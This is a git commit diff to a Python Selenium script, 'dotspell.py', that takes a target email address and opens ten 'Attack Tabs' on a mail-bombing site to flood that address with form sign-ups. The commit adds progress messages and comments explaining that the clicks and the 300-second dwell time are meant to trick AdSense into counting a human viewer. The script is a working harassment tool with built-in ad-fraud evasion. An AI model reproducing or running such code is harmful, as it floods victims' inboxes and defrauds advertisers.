b80a52d51b125f20f53cb6103f26936ae91265bf
warloxactual <47298985+warloxactual@users.noreply.github.com>
2021-08-04 14:09:37 -0700

    Added helpful text

--- dotspell.py
+++ dotspell.py
@@ -6,6 +6,10 @@ email = input('Please enter target email address: ')
 driver = webdriver.Chrome() 
 url = "https://mailbait.info/run.html"
 
+print(10*"-")
+print('Creating 10 Attack Tabs per script: ')
+print(10*"-")
+
 for i in range(10):
     driver.switch_to.window(driver.window_handles[-1])
     driver.get(url)
@@ -21,10 +25,10 @@ for i in range(10):
     run.click()
     
     print(f'The current tab is: {i + 1}')
-    categories_check.click()
+    categories_check.click() # This helps simulate a human user for adsense and moves the Categories out of the way so you can see the flow rate.
     
     print('Sleeping for 300 seconds...')
-    time.sleep(300)  
+    time.sleep(300) # This dwell time is important to trick adsense into thinking a human user is watching ads on mailbait.info.
 
     driver.execute_script("window.open('https://mailbait.info/run.html');")
     
@@ -32,4 +36,5 @@ driver.close()
 
 print(10*"-")
 print('Browser Window of 10 Attack Tabs at Full Speed = Complete')
+print('Check your Network tab or similar in your browser to watch forms being filled at lightspeed')
 print(10*"-")
